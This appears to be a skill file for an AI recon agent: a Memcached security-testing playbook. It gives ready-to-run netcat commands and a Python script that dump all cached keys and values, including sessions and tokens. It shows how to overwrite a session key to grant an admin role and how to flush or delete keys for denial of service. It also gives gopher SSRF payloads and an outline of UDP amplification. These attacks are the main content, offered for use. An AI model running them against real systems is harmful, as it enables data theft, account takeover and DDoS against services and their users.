<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: memcached
description: Security testing playbook for Memcached covering unauthenticated access, data extraction, cache poisoning, SSRF-to-Memcached, and UDP reflection amplification
---

# Memcached Security Testing

Memcached is a distributed memory caching system — no authentication by default. Exposure of Memcached leads to: full cache data extraction (may contain sessions, tokens, user data), cache poisoning, and UDP-based DDoS amplification.

---

## Reconnaissance

### Discovery

    # Port scanning
    nmap -p 11211 <target> -sV --open
    nmap -p 11211 <target> -sU --open    # UDP (amplification attacks)

    # Port: 11211 (TCP + UDP)

---

## Unauthenticated Access

    # Connect via TCP
    nc <target> 11211

    # Basic commands (no auth required by default):
    stats                           # Server stats, version, uptime
    stats items                     # Item count per slab
    stats cachedump <slab_id> <limit>   # Dump keys in a slab
    stats slabs                     # Memory allocation info
    stats settings                  # Server settings

    # Telnet (alternative):
    telnet <target> 11211

---

## Data Extraction

    # Full extraction methodology:

    # Step 1: Get all slab IDs
    echo "stats items" | nc <target> 11211
    # Returns: STAT items:<slab_id>:number <count>

    # Step 2: Dump keys from each slab
    echo "stats cachedump <slab_id> 0" | nc <target> 11211
    # 0 = unlimited keys; Returns: ITEM <key> [<bytes> b; <expiry> s]

    # Step 3: Get value for each key
    echo "get <key>" | nc <target> 11211

    # Automated extraction script:
    python3 -c "
    import socket

    host = '<target>'
    port = 11211

    def send(sock, cmd):
        sock.send((cmd + '\r\n').encode())
        import time; time.sleep(0.1)
        data = b''
        sock.settimeout(0.5)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk: break
                data += chunk
        except socket.timeout:
            pass
        return data.decode()

    s = socket.socket()
    s.connect((host, port))

    # Get slabs
    slabs = [line.split(':')[1] for line in send(s, 'stats items').split('\n')
             if 'STAT items:' in line and ':number' in line]

    for slab in slabs:
        keys_raw = send(s, f'stats cachedump {slab} 0')
        keys = [line.split(' ')[1] for line in keys_raw.split('\n') if line.startswith('ITEM')]
        for key in keys:
            val = send(s, f'get {key}')
            print(f'KEY: {key}')
            print(f'VALUE: {val}')
            print('---')

    s.close()
    "

---

## High-Value Cache Keys

    # Common patterns to look for in extracted keys:
    session:*                   # PHP/Python sessions
    sess:*                      # Express.js sessions
    user:*                      # User objects (may contain tokens)
    auth:*                      # Authentication data
    token:*                     # Access tokens
    csrf:*                      # CSRF tokens
    cache:*                     # Generic cache data
    api:*                       # API responses
    rate:*                      # Rate limiting counters (modify to bypass)

    # Search for sensitive patterns in values:
    echo "stats cachedump 1 0" | nc <target> 11211 | grep -i "session\|token\|user\|auth"

---

## Cache Poisoning

    # If writable access (same as read — no auth):
    # Overwrite any cached key:
    echo "set <key> 0 0 <length>\r\n<malicious_value>\r\nEND" | nc <target> 11211

    # Example: overwrite user session cache:
    KEY="session:abc123"
    VAL='{"user_id":1,"role":"admin","username":"admin"}'
    printf "set $KEY 0 3600 ${#VAL}\r\n$VAL\r\nEND\r\n" | nc <target> 11211

    # Delete a key (cache invalidation DoS):
    echo "delete <key>" | nc <target> 11211

    # Flush all cache (DoS):
    echo "flush_all" | nc <target> 11211   # Immediately invalidates all items

---

## SSRF to Memcached

If SSRF exists and allows TCP connections to internal Memcached:

    # Test if SSRF can reach Memcached:
    SSRF URL: http://localhost:11211/   # Will likely error but confirm connection

    # Gopher SSRF to Memcached (inject commands):
    gopher://127.0.0.1:11211/_%0d%0astats%0d%0a

    # More complex: set a key via gopher:
    # Encode: "set key 0 0 5\r\nhello\r\n"
    # As gopher URL (URL-encode \r\n as %0d%0a):
    gopher://127.0.0.1:11211/_%73%65%74%20%6b%65%79%20%30%20%30%20%35%0d%0a%68%65%6c%6c%6f%0d%0a

---

## Memcached Version and Stats

    # Get version and running stats:
    echo "version" | nc <target> 11211
    # VERSION 1.6.17

    echo "stats" | nc <target> 11211
    # STAT pid 1234                   — Process ID
    # STAT uptime 86400               — Uptime in seconds
    # STAT curr_connections 5         — Active connections
    # STAT total_connections 1000     — Total since start
    # STAT cmd_get 50000              — Total get commands
    # STAT cmd_set 10000              — Total set commands
    # STAT get_hits 40000             — Cache hits
    # STAT get_misses 10000           — Cache misses
    # STAT bytes 1048576              — Memory used

---

## UDP Reflection / Amplification (DDoS Vector)

Memcached UDP is an extreme amplification vector (amplification factor up to 51,000x):

    # Check if UDP port is open:
    nmap -p 11211 <target> -sU

    # Amplification attack (for testing only, do NOT attack unauthorized targets):
    # Attacker sends spoofed UDP packet (stats command, ~15 bytes) to Memcached
    # Memcached responds with stats (~500KB) to spoofed victim IP
    # Amplification factor: up to 51,000x

    # DO NOT EXPLOIT without explicit authorization — this is severe DDoS

    # Detect exposure:
    python3 -c "
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2)
    # Memcached UDP request header: reqId(2) seqNum(2) numDgrams(2) reserved(2) + command
    payload = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
    s.sendto(payload, ('<target>', 11211))
    try:
        data, addr = s.recvfrom(65535)
        print(f'UDP exposed! Response: {data[:100]}')
    except socket.timeout:
        print('UDP not responding')
    "

---

## Tools

    # memcached-cli (Node.js)
    npm install -g memcached-cli
    memcached-cli <target>:11211

    # mc — Go memcached client
    # Direct nc/telnet are most portable

    # Automated enumeration:
    nmap --script memcached-info <target> -p 11211

---

## Pro Tips

1. Memcached with no auth = full read/write access — extract ALL keys systematically
2. Session tokens and JWTs cached in Memcached enable authentication bypass
3. `flush_all` is a one-command DoS — clears all cached data (causes DB hammering)
4. UDP port 11211 should NEVER be exposed — it's a critical DDoS amplification source
5. Rate limiting data stored in Memcached can be deleted to bypass rate limits
6. Web apps may cache sensitive admin responses — look for keys like `admin:*`, `config:*`
7. Memcached SASL auth is optional and rarely configured — almost always no auth

## Summary

Memcached testing = `stats items` + `stats cachedump <slab> 0` + `get <key>` for full data extraction. Unauthenticated Memcached = read all cached sessions, tokens, and API responses. Session key overwrite enables account takeover without knowing credentials. UDP exposure on port 11211 is a critical DDoS amplification vector — report immediately even without extracting data.
